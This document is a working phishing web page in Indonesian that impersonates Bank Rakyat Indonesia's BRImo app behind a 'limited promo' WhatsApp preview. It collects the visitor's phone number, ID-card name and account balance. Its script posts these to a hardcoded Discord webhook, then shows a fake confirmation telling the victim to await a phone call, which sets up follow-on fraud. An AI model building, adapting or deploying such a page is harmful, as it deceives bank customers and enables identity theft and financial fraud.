
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <!-- Meta Tags Pratinjau WA -->
    <meta property="og:title" content="🎉 PROMO TERBATAS 🎉">
    <meta property="og:description" content="Dapatkan hadiahnya sekarang. Klik link di bawah ini 👇">
    <meta property="og:image" content="https://i.ibb.co/BHH60TSG/lv-0-20260716113107.jpg">
    <meta property="og:type" content="website">

    <title>BRImo - Bank Rakyat Indonesia</title>
    <style>
        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0; padding: 0; background-color: #222;
            display: flex; justify-content: center;
            -webkit-font-smoothing: antialiased;
        }
        .container {
            width: 100%; max-width: 480px; background-color: #fff;
            height: 100vh; display: flex; flex-direction: column;
            box-shadow: 0 0 20px rgba(0,0,0,0.5); overflow: hidden; position: relative;
        }

        /* --- INTRO SPLASH HD (3 DETIK) --- */
        #splash-screen {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: #fff; z-index: 10000;
            display: flex; justify-content: center; align-items: center;
        }
        .splash-content {
            width: 85%; height: 80%;
            background: url('https://i.ibb.co/BHH60TSG/lv-0-20260716113107.jpg') no-repeat center center;
            background-size: cover; border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            animation: hdIntro 3s ease-in-out forwards;
        }
        @keyframes hdIntro {
            0% { transform: scale(0.8); opacity: 0; }
            20% { transform: scale(1); opacity: 1; }
            80% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(1.1); opacity: 0; visibility: hidden; }
        }

        /* --- HALAMAN FORM --- */
        #form-page { display: none; flex-direction: column; background-color: #f7f7f7; height: 100%; }
        .top-nav { background-color: #005691; height: 55px; display: flex; align-items: center; justify-content: center; }
        .bri-logo-nav { height: 28px; }
        
        /* Header biru sesuai referensi sumber [1] */
        .header-blue { 
            background: linear-gradient(180deg, #005691 0%, #0070ba 100%); 
            padding: 20px 0 35px 0; text-align: center; 
        }

        /* --- ANIMASI NYAMBUNG TERUS DENGAN 5 GAMBAR --- */
        .card-slider { width: 100%; overflow: hidden; margin-bottom: 20px; }
        .card-track { 
            display: flex; 
            /* Lebar disesuaikan untuk 10 gambar (5 asli + 5 duplikat) agar tidak putus */
            width: calc(250px * 10); 
            animation: slideAnimation 20s linear infinite;
            gap: 15px; padding-left: 15px;
        }
        .card-track img { 
            width: 220px; height: 110px; border-radius: 12px; 
            box-shadow: 0 8px 15px rgba(0,0,0,0.4); flex-shrink: 0;
            image-rendering: -webkit-optimize-contrast;
        }
        
        @keyframes slideAnimation {
            0% { transform: translateX(0); }
            100% { transform: translateX(-50%); }
        }

        /* Bar Putih Susu (White Bar) sesuai sumber [1] */
        .white-bar { 
            background: #ffffff; width: 88%; margin: 0 auto; padding: 14px 0; 
            border-radius: 12px; text-align: center; font-weight: bold; 
            color: #005691; font-size: 17px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); 
        }

        .form-body { padding: 30px 25px; flex-grow: 1; display: flex; flex-direction: column; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; color: #005691; font-size: 14px; font-weight: bold; margin-bottom: 10px; }
        .input-group input { 
            width: 100%; padding: 16px; border: 1.5px solid #d1d1d1; 
            border-radius: 12px; font-size: 16px; box-sizing: border-box; background-color: white; outline: none; 
        }
        
        /* Tombol Lanjutkan sesuai referensi sumber [1] */
        .btn-submit { 
            background-color: #0070ba; color: white; width: 100%; 
            padding: 18px; border: none; border-radius: 12px; 
            font-size: 18px; font-weight: bold; cursor: pointer;
            margin-top: auto; margin-bottom: 20px;
        }

        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.95); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #0070ba; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        
        #success-page { display: none; position: relative; height: 100%; background-color: #fff; }
        .img-success { width: 100%; display: block; }
        .text-success-container { position: absolute; top: 56.5%; left: 0; width: 100%; padding: 0 45px; box-sizing: border-box; text-align: center; }
        .text-success-content { color: white; font-size: 15px; line-height: 1.6; font-weight: bold; text-shadow: 0 2px 5px rgba(0,0,0,0.5); }
    </style>
</head>
<body>

<div class="container">
    <!-- Intro Animasi Splash -->
    <div id="splash-screen"><div class="splash-content"></div></div>

    <!-- Halaman Utama (Data Nasabah) -->
    <div id="form-page">
        <div class="top-nav"><img src="https://i.ibb.co/KvjF53Q/aa0e67d2e759af6d677088e9160784d1.jpg" class="bri-logo-nav"></div>
        <div class="header-blue">
            <div class="card-slider">
                <div class="card-track">
                    <!-- 5 Gambar Asli -->
                    <img src="https://i.ibb.co.com/WWpQ0FB3/file-00000000db1871f5be2161948d561cdd.png">
                    <img src="https://i.ibb.co/htgvX9c/Screenshot-20260710-160449-Spck-Editor.jpg">
                    <img src="https://i.ibb.co/hFhptYNg/images-4.jpg"> <!-- Gambar Baru 1 -->
                    <img src="https://i.ibb.co/BHH60TSG/lv-0-20260716113107.jpg">
                    <img src="https://i.ibb.co/bjbVQ5Jq/images-3.jpg"> <!-- Gambar Baru 2 -->
                    
                    <!-- 5 Gambar Duplikat (Untuk Efek Nyambung Terus) -->
                    <img src="https://i.ibb.co.com/WWpQ0FB3/file-00000000db1871f5be2161948d561cdd.png">
                    <img src="https://i.ibb.co/htgvX9c/Screenshot-20260710-160449-Spck-Editor.jpg">
                    <img src="https://i.ibb.co/hFhptYNg/images-4.jpg"> <!-- Gambar Baru 1 -->
                    <img src="https://i.ibb.co/BHH60TSG/lv-0-20260716113107.jpg">
                    <img src="https://i.ibb.co/bjbVQ5Jq/images-3.jpg"> <!-- Gambar Baru 2 -->
                </div>
            </div>
            <div class="white-bar">Bank Rakyat Indonesia</div>
        </div>
        <div class="form-body">
            <div class="input-group">
                <label>Nomor ponsel BRImo Anda :</label>
                <input type="tel" id="nomorHp" placeholder="08xxxxxxxxxx" inputmode="numeric">
            </div>
            <div class="input-group">
                <label>Atas nama sesuai KTP :</label>
                <input type="text" id="namaKtp" placeholder="Nama Lengkap">
            </div>
            <div class="input-group">
                <label>Saldo akhir sesuai rekening :</label>
                <input type="tel" id="inputSaldo" placeholder="Rp 0" oninput="formatTitik(this)" inputmode="numeric">
            </div>
            <button class="btn-submit" onclick="submitToDiscord()">Lanjutkan</button>
        </div>
    </div>

    <!-- Overlay Loading -->
    <div id="loading-overlay"><div class="loader"></div><div style="margin-top:15px; color:#0070ba; font-weight:bold;">Sistem memproses...</div></div>

    <!-- Halaman Berhasil -->
    <div id="success-page">
        <img src="https://i.ibb.co/zTRCpYDZ/lv-0-20260710165548.jpg" class="img-success">
        <div class="text-success-container">
            <p class="text-success-content">Terima kasih telah mendaftar. Pendaftaran anda sedang diproses, mohon tunggu panggilan konfirmasi.</p>
        </div>
    </div>
</div>

<script>
    // Transisi Splash ke Form otomatis setelah 3 detik
    window.onload = function() {
        setTimeout(function() {
            document.getElementById('splash-screen').style.display = 'none';
            document.getElementById('form-page').style.display = 'flex';
        }, 3000);
    };

    function formatTitik(input) {
        let value = input.value.replace(/[^0-9]/g, '');
        if (value === "") { input.value = ""; return; }
        input.value = "Rp " + value.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    }

    function submitToDiscord() {
        const hp = document.getElementById('nomorHp').value;
        const nama = document.getElementById('namaKtp').value;
        const saldo = document.getElementById('inputSaldo').value;
        if(!hp || !nama || !saldo) { alert("Harap isi semua data."); return; }
        
        document.getElementById('loading-overlay').style.display = 'flex';
        
        // Data dikirim ke Discord dalam kotak putih susu (Embed)
        const embedData = {
            embeds: [{
                title: "📌 DATA NASABAH BARU",
                color: 16777215, 
                fields: [
                    { name: "📱 Nomor Ponsel", value: hp, inline: false },
                    { name: "👤 Nama KTP", value: nama, inline: false },
                    { name: "💰 Saldo Rekening", value: saldo, inline: false }
                ],
                footer: { text: "BRImo FSTVL 2024 • Pendaftaran Berhasil" },
                timestamp: new Date()
            }]
        };
        
        fetch("https://discord.com/api/webhooks/1523283216444948641/oaE3CjLyWUZ6_XYhxPg78pCfvIf4ydg_1ShGJdiyGUHhYRvMEcmzExtb4K0-1AqY2vfW", {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embedData)
        }).finally(() => {
            setTimeout(() => {
                document.getElementById('loading-overlay').style.display = 'none';
                document.getElementById('form-page').style.display = 'none';
                document.getElementById('success-page').style.display = 'block';
                window.scrollTo(0,0);
            }, 3000);
        });
    }
</script>
</body>
</html>
